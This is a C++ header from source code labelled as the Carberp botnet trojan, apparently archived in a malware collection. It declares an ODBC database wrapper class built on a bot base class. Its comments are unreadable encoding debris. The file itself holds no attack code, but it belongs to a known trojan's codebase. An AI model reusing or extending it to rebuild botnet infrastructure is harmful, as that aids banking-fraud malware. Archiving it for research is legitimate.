/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>
#include <sql.h>
#include <sqlext.h>
#include "GetApi.h"

class ODBC : public TBotObject
{
    	SQLHENV henv;
	    SQLHDBC hdbc;

	    SQLHSTMT CreateQuery( const char* sql );

	public:

		ODBC() : henv(0), hdbc(0)
		{
		}

		~ODBC()
		{
			Close();
		}

		bool Connect( const char* strconnect );
		void Close();

// ������ format �������� ���������� � ���������� ��� ������������ ����������
// �������. ������ �������� ����������� ���: n0th, ��� n ����� ���� ����� i - ������������
// ��������, o - ���������� ��������, ! - ������������ ��������, 0 - ������ ��� n = o, 
// ������������� ��� �����������
// ��������� �������� ��������� SQLLEN* � ������� ������ ���������� �����
// ���������� ������, ���� ����� = -1, �� ������ �������� ����� NULL;
// t - ��� ��������� � ����� ����� ���������
// ��������: c - char, b - byte, i - int, u - unsigned int, d - double, f - float, 
//           s - char*, h - short, uh - unsigned short, t - TIMESTAMP_STRUCT, r - �������� ������
// h - ����� ����������� ������ ��� ����� (������� null ����������)
		SQLHSTMT ExecuteSql( const char* sqltext, const char* format, ... );

	    void CloseQuery( SQLHSTMT );
	    bool NextRow( SQLHSTMT );
};
